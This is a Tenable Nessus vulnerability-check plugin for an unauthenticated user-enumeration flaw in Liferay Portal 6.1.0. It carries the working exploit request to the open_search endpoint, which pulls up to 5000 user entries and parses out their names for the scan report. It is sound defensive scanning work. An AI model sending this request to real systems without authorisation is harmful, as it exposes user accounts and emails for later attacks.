#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(59358);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2016/11/23 20:31:33 $");

  script_bugtraq_id(53546);

  script_name(english:"Liferay Portal 6.1.0 User Enumeration");
  script_summary(english:"Attempts to enumerate users");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Java application affected by an
information disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Liferay Portal hosted on the remote web server
contains a flaw in the 'SearchPermissionCheckerImpl' class's
'doGetPermissionQuery' method that allows a remote, unauthenticated
attacker to enumerate all user accounts.  It may be possible to
determine the email address of each of the enumerated users, as
well.");
  script_set_attribute(attribute:"solution", value:
"Update to the newest version in Git or to 6.2.0 when it becomes
available.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Liferay Users disclosure");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/522727");
  script_set_attribute(attribute:"see_also", value:"https://github.com/jelmerk/liferay-opensearch-exploit");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?1289a5ab");
  script_set_attribute(attribute:"see_also", value:"http://issues.liferay.com/browse/LPS-25877");
  script_set_attribute(attribute:"see_also", value:"http://issues.liferay.com/browse/LPS-27146");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/03/02");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/03/02");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/06/04");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:liferay:portal");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("liferay_detect.nasl");
  script_require_keys("www/liferay_portal");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80, 443, 8080);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("webapp_func.inc");

# Get the ports that web servers have been found on, defaulting to
# what Liferay uses with Tomcat, their recommended bundle.
port = get_http_port(default:8080);

# Get details of the Liferay Portal install.
install = get_install_from_kb(appname:"liferay_portal", port:port, exit_on_fail:TRUE);
dir = install["dir"];

# Attempt the enumeration of users.
params =
  "?p=1" +
  "&c=5000" +
  "&keywords=entryClassName:com.liferay.portal.model.User";

loc = dir + "/c/search/open_search";
url = build_url(port:port, qs:loc);
res = http_send_recv3(
  port         : port,
  method       : "GET",
  item         : loc + params,
  exit_on_fail : TRUE
);

# Ensure that we recognize the XML response.
if (
  res[2] !~ '<feed xmlns="http://www.w3.org/2005/Atom"' ||
  res[2] !~ '<liferay:entryClassName'
) audit(AUDIT_WEB_APP_NOT_AFFECTED, "Liferay Portal", url);

# Check if we got some users.
if (
  '<liferay:groupId' >!< res[2] ||
  '<liferay:entryClassName' >!< res[2] ||
  '<title>' >!< res[2] ||
  '</entry>' >!< res[2]
) audit(AUDIT_WEB_APP_NOT_AFFECTED, "Liferay Portal", url);

# Report our findings.
report = NULL;
if (report_verbosity > 0)
{
  report =
    '\nNessus was able to enumerate the list of users with the' +
    '\nfollowing HTTP request :' +
    '\n' +
    '\n  ' + url + params +
    '\n';

  if (report_verbosity > 1)
  {
    # Split the response into user entries.
    lines = split(res[2], sep:"</entry>");

    # Make a list of users.
    users = make_list();
    foreach line (lines)
    {
      matches = eregmatch(string:line, pattern:"<title><!.CDATA.Users and Organizations...(.*)..></title>");
      if (isnull(matches))
        continue;

      users = make_list(users, matches[1]);
    }

    if (max_index(users) != 0)
    {
      report +=
        '\nThe following users were found :'+
        '\n' +
        '\n  ' + join(users, sep:'\n  ') +
        '\n';
    }
  }
}

security_warning(port:port, extra:report);
